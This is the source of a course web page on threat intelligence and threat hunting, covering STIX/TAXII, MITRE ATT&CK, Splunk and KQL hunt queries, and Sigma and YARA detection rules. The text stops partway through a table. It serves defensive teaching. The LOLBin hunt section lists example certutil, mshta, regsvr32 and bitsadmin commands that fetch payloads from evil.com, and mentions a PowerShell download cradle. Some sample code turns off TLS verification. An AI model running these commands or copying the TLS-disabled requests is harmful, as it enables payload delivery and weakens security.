import { LearnLayout } from '@/components/content/LearnLayout'
import { KeyTakeaways } from '@/components/content/KeyTakeaways'
import { Callout } from '@/components/content/Callout'

const C = '#ff4757'

const Part = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div style={{ marginBottom: 48 }}>
    <h2 style={{ fontSize: 22, fontWeight: 700, color: C, marginBottom: 16 }}>{title}</h2>
    {children}
  </div>
)
const H = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontSize: 17, fontWeight: 600, color: 'var(--text)', marginBottom: 8, marginTop: 24 }}>{children}</h3>
)
const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ fontSize: 15, color: 'var(--text)', lineHeight: 1.9, marginBottom: 14 }}>{children}</p>
)
const Hl = ({ children }: { children: React.ReactNode }) => (
  <span style={{ color: C, fontWeight: 600 }}>{children}</span>
)
const HR = () => <hr style={{ border: 'none', borderTop: `1px solid ${C}22`, margin: '32px 0' }} />
const Block = ({ children }: { children: React.ReactNode }) => (
  <pre style={{
    background: 'var(--code-bg, #1a1a2e)', color: '#e2e8f0', borderRadius: 8,
    padding: '16px 20px', fontSize: 13, overflowX: 'auto', marginBottom: 20,
    border: `1px solid ${C}33`, lineHeight: 1.7, whiteSpace: 'pre-wrap', wordBreak: 'break-word'
  }}>{children}</pre>
)
const IQ = ({ q, a }: { q: string; a: string }) => (
  <div style={{ background: `${C}11`, border: `1px solid ${C}44`, borderRadius: 8, padding: '14px 18px', marginBottom: 16 }}>
    <div style={{ color: C, fontWeight: 700, fontSize: 13, marginBottom: 6 }}>Interview Question</div>
    <div style={{ fontWeight: 600, fontSize: 14, marginBottom: 6, color: 'var(--text)' }}>{q}</div>
    <div style={{ fontSize: 14, color: 'var(--text-secondary)', lineHeight: 1.8 }}>{a}</div>
  </div>
)
const Err = ({ title, bad, good }: { title: string; bad: string; good: string }) => (
  <div style={{ background: '#1a0a0a', border: `1px solid ${C}66`, borderRadius: 8, padding: '14px 18px', marginBottom: 16 }}>
    <div style={{ color: C, fontWeight: 700, fontSize: 13, marginBottom: 6 }}>Common Mistake — {title}</div>
    <div style={{ fontSize: 13, marginBottom: 4 }}><span style={{ color: '#ff6b6b' }}>Bad: </span><span style={{ color: '#ccc' }}>{bad}</span></div>
    <div style={{ fontSize: 13 }}><span style={{ color: '#51cf66' }}>Good: </span><span style={{ color: '#ccc' }}>{good}</span></div>
  </div>
)
const ProTip = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: '#0a1628', border: '1px solid #1e40af', borderRadius: 8, padding: '12px 16px', marginBottom: 16, fontSize: 14, color: '#93c5fd', lineHeight: 1.8 }}>
    <span style={{ fontWeight: 700 }}>Pro Tip: </span>{children}
  </div>
)

export default function Module34() {
  return (
    <LearnLayout
      title="Threat Intelligence and Threat Hunting"
      description="Move from reactive defence to proactive hunting. Learn threat intelligence consumption, STIX/TAXII, MITRE ATT&CK-based hunt hypotheses, detection engineering, and how to find attackers hiding in your environment before they announce themselves."
      section="Cybersecurity — Module 34"
      readTime="40 min"
      updatedAt="May 2026"
    >

      <Part title="Threat Intelligence Fundamentals">
        <P>
          Threat intelligence (TI) is evidence-based knowledge about adversaries: who they are, what they target, how they operate, and what tools they use. Good intelligence enables you to defend proactively — anticipating attacks rather than responding to them.
        </P>
        <P>
          The distinction between data, information, and intelligence matters: a raw IP address is data; "this IP is associated with scanning" is information; "this IP is used by APT29 for spearphishing campaigns targeting financial institutions in Q2 2026, using PDF attachments exploiting CVE-2025-XXXX" is intelligence.
        </P>

        <H>Intelligence Types</H>
        <div style={{ overflowX: 'auto', marginBottom: 20 }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 13 }}>
            <thead>
              <tr style={{ background: `${C}22` }}>
                {['Type', 'What It Covers', 'Consumer', 'Time to Action'].map(h => (
                  <th key={h} style={{ padding: '10px 14px', textAlign: 'left', color: C, fontWeight: 700, border: `1px solid ${C}33` }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {[
                ['Strategic', 'Nation-state motivations, industry targeting trends, geopolitical context', 'CISO, Board, Risk', 'Months — shapes programme priorities'],
                ['Operational', 'Specific campaign details, actor infrastructure, planned operations', 'SOC lead, IR team', 'Days/weeks — shapes hunt hypotheses'],
                ['Tactical', 'Specific TTPs: techniques, tooling, procedures used by actors', 'Detection engineers, threat hunters', 'Days — creates detection rules'],
                ['Technical', 'IOCs: IPs, domains, file hashes, URLs, YARA rules', 'SOC analysts, SIEM', 'Hours/real-time — block and detect'],
              ].map(([t, w, c, time], i) => (
                <tr key={i} style={{ background: i % 2 === 0 ? 'transparent' : `${C}08` }}>
                  {[t, w, c, time].map((v, j) => (
                    <td key={j} style={{ padding: '9px 14px', color: 'var(--text)', border: `1px solid ${C}22`, fontSize: 13 }}>{v}</td>
                  ))}
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        <H>Intelligence Sources</H>
        <Block>{`Threat intelligence source categories:

OSINT (Open Source — free):
  - MITRE ATT&CK (attack.mitre.org) — adversary TTP library
  - CISA Advisories (cisa.gov) — US government threat reports
  - AlienVault OTX (otx.alienvault.com) — community IOC sharing
  - Abuse.ch (abuse.ch) — malware/botnet C2 IOCs (URLhaus, MalwareBazaar, Feodo)
  - Shodan (shodan.io) — exposed infrastructure intel
  - VirusTotal (virustotal.com) — file/URL reputation
  - ThreatFox (threatfox.abuse.ch) — IOC feed (API available)
  - URLScan.io — website screenshot and IOC extraction
  - GreyNoise (greynoise.io) — internet background noise vs. targeted scanning

Commercial:
  - Mandiant Advantage / Recorded Future — premium APT reporting
  - CrowdStrike Intelligence — threat actor profiles
  - Palo Alto Unit42 — campaign reports with IOCs

ISAC/ISAO (sector-specific, vetted sharing):
  - FS-ISAC (financial sector)
  - H-ISAC (healthcare)
  - E-ISAC (energy)
  - MS-ISAC (state, local, tribal, territorial government)

Internal (most actionable for your org):
  - Your own SIEM data patterns
  - Threat hunt findings
  - Phishing email submissions from users`}
        </Block>

        <H>Traffic Light Protocol (TLP)</H>
        <P>
          TLP is a standardised marking system used to control how threat intelligence can be shared. Always respect TLP markings when sharing information you receive.
        </P>
        <Block>{`TLP Classifications (TLP 2.0):

TLP:RED    — Not for disclosure; restricted to specific recipients only
             Shared in personal conversation; do not post anywhere

TLP:AMBER  — Restricted: share within your organisation and clients/customers
             on a need-to-know basis

TLP:AMBER+STRICT — Share only within your organisation (no clients)

TLP:GREEN  — Community sharing: share within the sector/community
             Do not post publicly

TLP:CLEAR  — No restriction; publicly shareable
             (this designation replaces TLP:WHITE)

Always check: "What TLP marking did this intelligence arrive with?"
before including it in a report or sharing with a partner.`}
        </Block>
      </Part>

      <HR />

      <Part title="STIX and TAXII — Structured Intelligence Sharing">
        <P>
          Exchanging threat intelligence manually (PDFs, emails) does not scale. <Hl>STIX (Structured Threat Information eXpression)</Hl> is a language for describing threat intelligence as machine-readable JSON objects. <Hl>TAXII (Trusted Automated eXchange of Intelligence Information)</Hl> is the transport protocol for sharing STIX content.
        </P>

        <H>STIX 2.1 Core Objects</H>
        <Block>{`STIX Domain Objects (SDOs) — the vocabulary of threat intelligence:

Indicator      → Pattern that identifies suspicious or malicious activity
                 Example: file hash, IP address, URL pattern

Malware        → Malicious code description with capabilities
                 Example: "Emotet — banking trojan, loader functionality"

Threat Actor   → Individual or group conducting attacks
                 Example: APT29 (Cozy Bear), FIN7, Lazarus Group

Campaign       → Related activity over time with common intent
                 Example: "SolarWinds supply chain campaign, 2020"

Attack Pattern → TTP description — maps to MITRE ATT&CK
                 Example: "T1059.001 — PowerShell execution"

Tool           → Legitimate software used offensively
                 Example: Mimikatz, CobaltStrike, PsExec

Vulnerability  → CVE or weakness exploited
                 Example: CVE-2021-44228 (Log4Shell)

Course of Action → Mitigations and remediations
                 Example: "Apply patch, block inbound traffic on port 8080"

STIX Relationships link objects together:
  Threat Actor → uses → Malware
  Campaign → attributed-to → Threat Actor
  Indicator → indicates → Malware`}
        </Block>

        <H>STIX 2.1 — Sample JSON</H>
        <Block>{`{
  "type": "bundle",
  "id": "bundle--8f431e96-b545-4e20-a26d-123456789abc",
  "objects": [
    {
      "type": "indicator",
      "spec_version": "2.1",
      "id": "indicator--8e2e2d2b-17d4-4cbf-938f-98d0f7e2c1b4",
      "name": "Cobalt Strike C2 — known infrastructure",
      "pattern": "[network-traffic:dst_ref.type = 'ipv4-addr' AND network-traffic:dst_ref.value = '185.220.101.47']",
      "pattern_type": "stix",
      "valid_from": "2026-05-01T00:00:00Z",
      "indicator_types": ["malicious-activity"],
      "labels": ["cobalt-strike", "c2"],
      "confidence": 85
    },
    {
      "type": "malware",
      "spec_version": "2.1",
      "id": "malware--0c7b5b88-8ff7-4a4d-aa9d-feb398cd0061",
      "name": "Cobalt Strike",
      "malware_types": ["remote-access-trojan"],
      "is_family": false,
      "capabilities": ["exfiltrate-data", "provide-shell-access"]
    },
    {
      "type": "relationship",
      "spec_version": "2.1",
      "id": "relationship--57b56a43-b8b0-4cba-9deb-34e3a5a0cdee",
      "relationship_type": "indicates",
      "source_ref": "indicator--8e2e2d2b-17d4-4cbf-938f-98d0f7e2c1b4",
      "target_ref": "malware--0c7b5b88-8ff7-4a4d-aa9d-feb398cd0061"
    }
  ]
}`}
        </Block>

        <H>Consuming TAXII Feeds</H>
        <Block>{`# Python — consume a TAXII 2.1 server (e.g., MITRE ATT&CK)
from taxii2client.v21 import Server, as_pages
import json

# Connect to MITRE ATT&CK TAXII server
server = Server("https://attack-taxii.mitre.org/taxii2/")
api_root = server.api_roots[0]

# List available collections (each ATT&CK matrix is a collection)
for collection in api_root.collections:
    print(f"{collection.id}: {collection.title}")

# Fetch enterprise ATT&CK objects
from taxii2client.v21 import Collection
collection = Collection(
    "https://attack-taxii.mitre.org/api/v21/collections/enterprise_attack/objects/",
    auth=None
)

# Iterate through objects with pagination
for page in as_pages(collection.get_objects, per_request=50):
    for obj in page.get("objects", []):
        if obj["type"] == "attack-pattern":
            print(f"{obj.get('name')}: {obj.get('external_references', [{}])[0].get('external_id')}")`}
        </Block>

        <H>Automating IOC Ingestion</H>
        <Block>{`# Ingest IOCs from abuse.ch ThreatFox API into SIEM
import requests, json

API_KEY = "your_threatfox_api_key"

# Query recent high-confidence IOCs
payload = {
    "query": "get_iocs",
    "days": 7,        # last 7 days
    "min_confidence": 75
}
r = requests.post("https://threatfox-api.abuse.ch/api/v1/",
                  auth=("user", API_KEY), json=payload)
iocs = r.json().get("data", [])

# Process and push to SIEM
for ioc in iocs:
    print(f"Type: {ioc['ioc_type']}, Value: {ioc['ioc']}, "
          f"Malware: {ioc.get('malware_printable')}, "
          f"Confidence: {ioc['confidence_level']}%")

# Push to Splunk via HEC (HTTP Event Collector)
import requests
splunk_hec = "https://splunk.company.com:8088/services/collector"
headers = {"Authorization": "Splunk YOUR_HEC_TOKEN"}
for ioc in iocs:
    event = {"event": ioc, "sourcetype": "threatfox:ioc", "index": "threat_intel"}
    requests.post(splunk_hec, headers=headers, json=event, verify=False)`}
        </Block>

        <IQ
          q="What is STIX/TAXII and why is it important for threat intelligence programmes?"
          a="STIX (Structured Threat Information eXpression) is a standardised JSON-based language for describing threat intelligence: indicators, malware, threat actors, attack patterns, campaigns, and relationships between them. TAXII (Trusted Automated eXchange of Intelligence Information) is the HTTP-based transport protocol for sharing STIX content between organisations and platforms. Together they enable machine-readable, automated intelligence sharing — instead of emailing PDFs, you push STIX bundles to a TAXII server that your SIEM or threat intel platform automatically ingests. This matters because manual IOC sharing cannot scale: when a new ransomware campaign is identified, STIX/TAXII lets thousands of organisations automatically block the C2 infrastructure within minutes of a trusted partner publishing the indicator."
        />
      </Part>

      <HR />

      <Part title="MITRE ATT&CK Framework">
        <P>
          MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible knowledge base of real-world adversary behaviours, documented from actual breach observations. It is the single most important framework in modern cybersecurity defence.
        </P>
        <P>
          ATT&CK structures adversary behaviour into <Hl>tactics</Hl> (the why — what the attacker is trying to achieve) and <Hl>techniques/sub-techniques</Hl> (the how — specific methods used to achieve the tactic).
        </P>

        <H>ATT&CK Tactics — Enterprise Matrix</H>
        <Block>{`14 Tactics in the Enterprise ATT&CK Matrix:

TA0043  Reconnaissance        — Gathering info before attack
TA0042  Resource Development  — Building attacker infrastructure
TA0001  Initial Access        — How attackers get in (phishing, exploits, supply chain)
TA0002  Execution             — Running attacker code (PowerShell, WMI, macros)
TA0003  Persistence           — Maintaining access (scheduled tasks, services, registry)
TA0004  Privilege Escalation  — Getting higher permissions (sudo exploit, token impersonation)
TA0005  Defense Evasion       — Avoiding detection (obfuscation, log clearing, LOLBins)
TA0006  Credential Access     — Stealing credentials (Mimikatz, Kerberoasting, keylogging)
TA0007  Discovery             — Learning the environment (net commands, BloodHound, recon)
TA0008  Lateral Movement      — Moving to other systems (PtH, WinRM, RDP, SMB)
TA0009  Collection            — Gathering target data (screen capture, email collection, keylog)
TA0011  Command and Control   — Communicating with compromised systems (C2 beacons)
TA0010  Exfiltration          — Stealing data (DNS tunnel, HTTPS, cloud storage)
TA0040  Impact                — Disrupting operations (ransomware, wiper, service stop)`}
        </Block>

        <H>Key Techniques to Know</H>
        <div style={{ overflowX: 'auto', marginBottom: 20 }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 13 }}>
            <thead>
              <tr style={{ background: `${C}22` }}>
                {['ID', 'Name', 'Tactic', 'Detection Approach'].map(h => (
                  <th key={h} style={{ padding: '10px 14px', textAlign: 'left', color: C, fontWeight: 700, border: `1px solid ${C}33` }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {[
                ['T1059.001', 'PowerShell', 'Execution', 'Event ID 4104 (PS script block logging), unusual parent process'],
                ['T1566.001', 'Spearphishing Attachment', 'Initial Access', 'Email gateway alerts, Office macro execution, suspicious child processes'],
                ['T1078', 'Valid Accounts', 'Initial Access + Persistence', 'Logon from unusual geolocation, time-of-day anomaly, new device'],
                ['T1003.001', 'LSASS Memory', 'Credential Access', 'Event ID 10 (Sysmon) — process accessing LSASS; Defender ATP alert'],
                ['T1055', 'Process Injection', 'Defense Evasion', 'Unexpected memory read/write across processes, unusual module loads'],
                ['T1021.002', 'SMB/Windows Admin Shares', 'Lateral Movement', 'Event ID 4648 / 5140 — network logon to admin shares from unusual source'],
                ['T1053.005', 'Scheduled Task/Job', 'Persistence', 'Event ID 4698 — scheduled task creation; schtasks with unusual paths'],
                ['T1071.001', 'Web Protocols (C2)', 'Command and Control', 'JA3/JA3S TLS fingerprinting, beaconing detection in proxy logs'],
                ['T1041', 'Exfiltration Over C2 Channel', 'Exfiltration', 'Large outbound transfers, SRUM network bytes per process anomaly'],
                ['T1486', 'Data Encrypted for Impact', 'Impact', 'Rapid file modification, extension change, Event ID 4663 spike'],
              ].map(([id, name, tactic, detect], i) => (
                <tr key={i} style={{ background: i % 2 === 0 ? 'transparent' : `${C}08` }}>
                  {[id, name, tactic, detect].map((c, j) => (
                    <td key={j} style={{ padding: '9px 14px', color: 'var(--text)', border: `1px solid ${C}22`, fontSize: 13 }}>{c}</td>
                  ))}
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        <H>ATT&CK Navigator — Coverage Mapping</H>
        <Block>{`ATT&CK Navigator use cases:

1. Map your detections to ATT&CK
   - Colour techniques where you have detection rules (green)
   - Identify gaps (uncoloured = blind spot)
   - Prioritise detection engineering backlog based on gaps

2. Map a specific threat actor to your environment
   - Pull APT29's known techniques from ATT&CK
   - Overlay against your detection coverage
   - Hunt for techniques where attacker is known to operate but you are blind

3. Red team coverage planning
   - Give red team the techniques you have no detection for
   - Validate purple team exercises

ATT&CK Navigator is available at:
  https://mitre-attack.github.io/attack-navigator/
  (browser-based, no install — export as JSON or SVG)

Python: query ATT&CK programmatically
from attackcti import attack_client

lift = attack_client()
all_techniques = lift.get_enterprise_techniques()
apt29 = lift.get_group_by_alias("APT29")
apt29_techniques = lift.get_techniques_used_by_group(apt29[0])

for t in apt29_techniques:
    print(f"{t['technique_id']}: {t['technique']}")`}
        </Block>

        <IQ
          q="How do you use MITRE ATT&CK to improve your detection coverage?"
          a="Start by mapping every existing detection rule or alert to an ATT&CK technique ID. Use ATT&CK Navigator to visualise coverage — techniques you detect are highlighted, gaps are blank. Then prioritise your engineering backlog by two factors: techniques commonly used by threat actors targeting your industry (pull their profiles from ATT&CK), and techniques associated with high-impact outcomes like credential access, lateral movement, and exfiltration. Write one new detection rule per week for the highest-priority gap. Re-evaluate coverage quarterly after adding new detections and after threat actor profiles change. This turns detection engineering from ad-hoc alert creation into a structured programme with measurable progress."
        />
      </Part>

      <HR />

      <Part title="Threat Hunting">
        <P>
          Threat hunting is the proactive, human-driven search for adversaries that have evaded automated detection. The assumption is that <Hl>sophisticated attackers are already in your environment — you just have not found them yet</Hl>. Automated tools detect known-bad; threat hunters look for unknown-bad.
        </P>
        <P>
          Hunting requires: a hypothesis about attacker behaviour, access to sufficient log data (EDR telemetry, network flows, authentication logs), and an analyst who knows what normal looks like.
        </P>

        <H>The Hunting Hypothesis Model</H>
        <Block>{`Hypothesis structure:

"I believe [threat actor / malware family] may have [technique]
 because [intelligence or anomaly], which would be visible in
 [log source] as [specific observable behaviour]."

Examples:

Hunt 1 — Based on threat intelligence:
"I believe APT29-style attackers may have used PowerShell download cradles
 for initial payload delivery (T1059.001) because our sector is actively
 targeted, which would be visible in Windows Event ID 4104 (PowerShell
 script block logging) as Base64-encoded commands containing 'IEX' or
 'DownloadString'."

Hunt 2 — Based on baseline anomaly:
"I believe a compromised host may be beaconing to a C2 server
 (T1071.001) because our proxy logs show a host making HTTPS
 requests at suspiciously regular 60-second intervals to a newly
 registered domain, which would be visible in proxy logs as
 connections with consistent byte sizes and timing variance below 2 seconds."

Hunt 3 — Based on post-incident intelligence:
"I believe the attacker from last month's incident may have lateral
 movement foothold we missed (T1021.002) because they had domain
 admin credentials, which would be visible in authentication logs as
 Event ID 4648 (explicit credential logon) from the compromised server
 IP to other production hosts."`}
        </Block>

        <H>Hunt 1 — Detecting Encoded PowerShell (T1059.001)</H>
        <Block>{`# Hypothesis: attackers using Base64-encoded PowerShell to evade detection

# Splunk — find encoded PowerShell commands
index=windows source="WinEventLog:Microsoft-Windows-PowerShell/Operational"
  EventCode=4104
| where match(ScriptBlockText, "(?i)(FromBase64String|IEX|Invoke-Expression|DownloadString|WebClient|Net\.WebClient)")
| rex field=ScriptBlockText "(?i)FromBase64String\('(?P<encoded>[A-Za-z0-9+/=]+)'"
| eval decoded = if(isnotnull(encoded), tostring(base64decode(encoded)), "N/A")
| table _time, ComputerName, UserID, ScriptBlockText, decoded
| sort -_time

# KQL (Microsoft Sentinel)
SecurityEvent
| where EventID == 4104
| where ScriptBlockText has_any ("FromBase64String", "IEX", "DownloadString", "WebClient")
| extend DecodedScript = base64_decode_tostring(extract(@"FromBase64String\('([A-Za-z0-9+/=]+)'",
                          1, ScriptBlockText))
| project TimeGenerated, Computer, Account, ScriptBlockText, DecodedScript
| order by TimeGenerated desc

# What you're looking for:
# - IEX (New-Object Net.WebClient).DownloadString('http://...') — download cradle
# - Invoke-Mimikatz — credential theft
# - -EncodedCommand — command-line encoding flag
# - Invoke-ReflectivePEInjection — fileless malware loading`}
        </Block>

        <H>Hunt 2 — Detecting C2 Beaconing</H>
        <Block>{`# Hypothesis: compromised host making regular C2 check-ins
# Observable: connections to same destination at suspiciously regular intervals

# Python — detect beaconing from proxy/firewall logs
import pandas as pd
from datetime import datetime

# Load proxy logs (columns: timestamp, src_ip, dst_domain, bytes_out)
df = pd.read_csv("proxy_logs.csv", parse_dates=["timestamp"])

# For each src+dst pair, calculate timing statistics
groups = df.groupby(["src_ip", "dst_domain"])

beacons = []
for (src, dst), group in groups:
    if len(group) < 10:  # need enough samples
        continue
    group = group.sort_values("timestamp")
    # Calculate time deltas between connections
    deltas = group["timestamp"].diff().dt.total_seconds().dropna()

    # Beaconing signature: low standard deviation in connection intervals
    if deltas.std() < 30 and deltas.mean() < 300:  # regular, frequent
        beacons.append({
            "src": src, "dst": dst,
            "count": len(group),
            "avg_interval_sec": round(deltas.mean(), 1),
            "std_dev_sec": round(deltas.std(), 1),
            "total_bytes": group["bytes_out"].sum()
        })

# Sort by regularity (lowest std_dev = most suspicious)
beacons_df = pd.DataFrame(beacons).sort_values("std_dev_sec")
print(beacons_df.head(20))`}
        </Block>

        <H>Hunt 3 — Kerberoasting Detection</H>
        <Block>{`# Hypothesis: attacker requesting Kerberos service tickets for cracking offline
# T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting

# Splunk — detect bulk Kerberos TGS requests (Event ID 4769)
index=windows EventCode=4769
  TicketEncryptionType=0x17   # RC4 — only weak encryption requests
  ServiceName!="krbtgt"       # exclude TGT requests
  ServiceName!="*$"           # exclude computer accounts
| stats count as request_count by Account, IpAddress, ServiceName
| where request_count > 5     # multiple requests from same source
| sort -request_count

# Interpretation:
# - RC4 (0x17) encryption requested instead of AES: attacker forcing crackable ticket
# - Many requests from one account/IP in short window: automated tooling
# - Non-computer, non-krbtgt service names: targeting human service accounts

# PowerShell — check service accounts with SPNs (vulnerable to Kerberoasting)
# (run as single pipeline — backtick line continuation omitted for readability)
Get-ADUser -Filter * -Properties SamAccountName,ServicePrincipalName,PasswordLastSet,Enabled |
  Where-Object { $_.ServicePrincipalName -ne $null -and $_.Enabled -eq $true } |
  Select-Object SamAccountName, ServicePrincipalName, PasswordLastSet |
  Format-Table -AutoSize

# Defensive countermeasure:
# Enable AES-only encryption on service accounts (removes RC4 option)
Set-ADUser -Identity svc-sql -KerberosEncryptionType AES256`}
        </Block>

        <H>Hunt 4 — Living-off-the-Land (LOLBin) Abuse</H>
        <Block>{`# Hypothesis: attacker using legitimate Windows binaries to evade detection
# T1218 — System Binary Proxy Execution

# Commonly abused LOLBins:
# certutil.exe — download files: certutil -urlcache -f http://evil.com/file.exe
# mshta.exe    — execute HTA: mshta http://evil.com/payload.hta
# regsvr32.exe — script execution: regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll
# wmic.exe     — remote execution: wmic /node:TARGET process call create "cmd.exe"
# bitsadmin    — download: bitsadmin /transfer job http://evil.com/file.exe %TEMP%

# Splunk — detect LOLBin abuse via command-line anomalies
index=windows EventCode=4688
| where match(CommandLine, "(?i)(certutil.*url|mshta.*http|regsvr32.*/i:http|bitsadmin.*/transfer.*http)")
| table _time, ComputerName, Account, ParentProcessName, NewProcessName, CommandLine
| sort -_time

# KQL (Sentinel)
SecurityEvent
| where EventID == 4688
| where CommandLine has_any ("certutil", "mshta", "regsvr32", "bitsadmin")
| where CommandLine has_any ("http://", "https://", "\\\\")
| project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

# YARA rule for LOLBin persistence in scripts
rule LOLBin_Download_Cradle {
    strings:
        $a = "certutil" nocase
        $b = "-urlcache" nocase
        $c = "http" nocase
    condition:
        all of them
}`}
        </Block>

        <IQ
          q="What is the difference between threat intelligence and threat hunting, and how do they work together?"
          a="Threat intelligence is knowledge about adversaries — their identities, motivations, tools, and techniques. Threat hunting is the active search for adversaries hiding in your environment using that intelligence. They work together in a cycle: intelligence provides the hypothesis (APT29 is targeting organisations like yours using T1059.001 PowerShell execution), hunting tests that hypothesis in your own environment (are we seeing encoded PowerShell from unusual parent processes?), and hunting findings feed back into intelligence (we found this new C2 domain, which we share via STIX to the community). Intelligence without hunting creates dashboards no one acts on; hunting without intelligence is random searching. Together they create a proactive, intelligence-led defence posture."
        />
      </Part>

      <HR />

      <Part title="Detection Engineering">
        <P>
          Detection engineering is the discipline of building, testing, and maintaining detection logic that reliably identifies malicious activity. It bridges threat intelligence (knowing what to look for) and SIEM/EDR (the platform that looks for it).
        </P>

        <H>Detection Quality Metrics</H>
        <Block>{`Detection rule quality dimensions:

True Positive Rate (Sensitivity):
  - Does the rule fire when the attack actually occurs?
  - Test: run the attack in a lab and confirm detection

False Positive Rate (Specificity):
  - Does the rule fire on benign activity?
  - Target: < 5% FP rate for high-priority rules
  - High FP = alert fatigue = analysts ignore all alerts

Coverage:
  - What % of attack variations does the rule cover?
  - Single-command rules are brittle; behaviour-based rules are resilient

Time to Detection:
  - How quickly does the rule fire after attack begins?
  - Real-time is ideal; batch (hourly) may miss fast-moving incidents

Maintainability:
  - Will this rule break after a software update?
  - Is there documentation explaining what it detects and why?`}
        </Block>

        <H>Sigma — Vendor-Agnostic Detection Rules</H>
        <P>
          Sigma is an open-source rule format for writing detection rules once and converting them to any SIEM platform (Splunk, KQL, Elastic, QRadar). Write in Sigma; deploy anywhere.
        </P>
        <Block>{`# Sigma rule example — detecting Mimikatz LSASS access
title: Mimikatz LSASS Access via Sysmon Event 10
id: 5ef9853e-4d0e-4a70-846f-a9ca37d876da
status: stable
description: Detects Mimikatz accessing LSASS to dump credentials
author: Detection Engineering Team
date: 2026/05/10
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    product: windows
    category: process_access          # Sysmon Event ID 10
detection:
    selection:
        TargetImage|endswith: '\\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'
            - '0x1410'
            - '0x147a'
            - '0x143a'
    filter_legitimate:
        SourceImage|endswith:
            - '\\MsMpEng.exe'          # Windows Defender
            - '\\csrss.exe'
            - '\\wininit.exe'
    condition: selection and not filter_legitimate
falsepositives:
    - Security scanning tools
    - Some backup software (document exceptions)
level: high

# Convert Sigma rule to Splunk SPL:
sigma convert -t splunk -p sysmon rule.yml

# Convert to KQL (Microsoft Sentinel):
sigma convert -t microsoft365defender -p sysmon rule.yml`}
        </Block>

        <H>YARA Rules — File-Based Detection</H>
        <Block>{`# YARA — pattern matching for malware detection
# Used by antivirus, EDR, sandbox platforms, and incident responders

rule Cobalt_Strike_Beacon {
    meta:
        description = "Detects common Cobalt Strike beacon strings"
        author = "Detection Team"
        date = "2026-05-10"
        reference = "Internal research"

    strings:
        $a = "ReflectiveLoader" ascii
        $b = "%s as %s\\%s: %d" ascii
        $c = { 68 XX XX XX XX 8D XX XX E8 XX XX XX XX }   // push+call pattern
        $pe = { 4D 5A }                                    // MZ header (PE file)

    condition:
        $pe at 0 and
        ($a or $b or $c)
}

# Scan a directory with YARA
yara -r cobalt_strike.yar /path/to/scan/

# Run YARA against memory (via Volatility plugin)
vol -f memory.raw windows.vadyarascan --yara-file cobalt_strike.yar`}
        </Block>

        <H>Detection as Code — CI/CD for Rules</H>
        <Block>{`# Detection engineering workflow with version control

# Directory structure
detections/
  sigma/
    credential_access/
      t1003_001_lsass_access.yml
      t1558_003_kerberoasting.yml
    lateral_movement/
      t1021_002_smb_admin_shares.yml
  yara/
    malware/
      cobalt_strike.yar
  tests/
    t1003_001_lsass_access_test.py

# GitHub Actions — validate and deploy detection rules
name: Detection Rule Pipeline
on: [push, pull_request]

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install sigma
        run: pip install sigma-cli
      - name: Validate all sigma rules
        run: |
          for rule in detections/sigma/**/*.yml; do
            sigma check "$rule" || exit 1
          done
      - name: Convert to Splunk (for diff review)
        run: sigma convert -t splunk -p sysmon detections/sigma/ -o output/splunk/

  test:
    runs-on: ubuntu-latest
    steps:
      - name: Run detection unit tests
        run: python -m pytest detections/tests/ -v

  deploy:
    if: github.ref == 'refs/heads/main'
    needs: [validate, test]
    steps:
      - name: Push rules to Splunk
        env:
          SPLUNK_TOKEN: \${{ secrets.SPLUNK_TOKEN }}
        run: |
          for rule in output/splunk/*.conf; do
            curl -k -X POST https://splunk.company.com:8089/services/saved/searches \
              -H "Authorization: Splunk $SPLUNK_TOKEN" --data-binary "@$rule"
          done`}
        </Block>

        <Err
          title="Writing brittle single-event detection rules"
          bad="Write a rule that fires only when 'mimikatz.exe' appears in a process name — trivially evaded by renaming the binary."
          good="Detect behaviour: LSASS access with specific GrantedAccess flags (0x1010, 0x1410), unusual parent-child process relationships, or process injection patterns. Behaviour-based rules survive binary renaming, recompilation, and obfuscation. Use Sigma's category-based logsource to avoid tying rules to specific field names."
        />

        <Err
          title="No false positive testing before deployment"
          bad="Deploy a new detection rule directly to production SIEM without testing against historical legitimate traffic — it floods the SOC with hundreds of alerts on day one."
          good="Test every new rule against 30-90 days of historical log data before deployment to measure the false positive rate. Target below 5% FP for high/critical rules, below 20% for medium. Only deploy after tuning exception lists. Alert fatigue from high-FP rules causes analysts to stop investigating real alerts."
        />

        <Err
          title="No documentation on what a rule detects"
          bad="Deploy a KQL rule with no description, no ATT&CK mapping, and no false positive guidance. Analysts cannot triage the alerts it generates because they do not know what the rule is looking for."
          good="Every detection rule must have: description of what attack technique it detects, ATT&CK technique IDs, expected false positives and how to identify them, severity and recommended response action, author and date. Use Sigma format — documentation is built into the schema."
        />
      </Part>

      <HR />

      <Part title="Threat Actor Profiling">
        <P>
          Understanding who is targeting your organisation and industry helps focus defensive investment. Not every technique in the ATT&CK matrix is equally likely — <Hl>the threat actors relevant to your sector have predictable patterns</Hl>.
        </P>

        <H>Major Threat Actor Categories</H>
        <div style={{ overflowX: 'auto', marginBottom: 20 }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 13 }}>
            <thead>
              <tr style={{ background: `${C}22` }}>
                {['Category', 'Motivation', 'Sophistication', 'Primary Targets', 'Example Groups'].map(h => (
                  <th key={h} style={{ padding: '10px 14px', textAlign: 'left', color: C, fontWeight: 700, border: `1px solid ${C}33` }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {[
                ['Nation-State (APT)', 'Espionage, IP theft, critical infrastructure disruption', 'Very high — zero-days, custom tooling', 'Government, defence, energy, healthcare', 'APT29 (Russia), APT41 (China), Lazarus (DPRK)'],
